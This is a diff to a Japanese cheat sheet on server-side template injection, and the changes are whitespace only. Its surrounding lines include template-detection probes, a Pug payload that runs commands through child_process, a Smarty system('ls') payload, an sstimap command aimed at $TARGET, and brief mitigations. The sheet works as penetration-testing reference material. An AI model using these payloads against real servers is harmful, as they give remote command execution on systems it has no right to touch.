@@ -1,6 +1,7 @@
 # SSTI サーバー側テンプレートインジェクション
 
 ## テンプレートの判別
+
 ```
 # Twig（PHP）
 {{7*'7'}} -> 49
@@ -19,7 +20,7 @@
 
 ### Pug
 
-javascriptコードを直接実行できる
+javascript コードを直接実行できる
 
 ```javascript
 #{root.process.mainModule.require('child_process').spawnSync('ls', ['-al']).stdout}
@@ -27,7 +28,7 @@ javascriptコードを直接実行できる
 
 ### Smarty
 
-PHPコードを直接実行できる
+PHP コードを直接実行できる
 
 ```PHP
 {system("ls")}
@@ -63,5 +64,6 @@ python3 sstimap.py -X POST -u 'http://$TARGET/' -d 'page='
 ```
 
 ## セキュリティ
+
 - ユーザー入力のサニタイズ
 - 環境のサンドボックス化
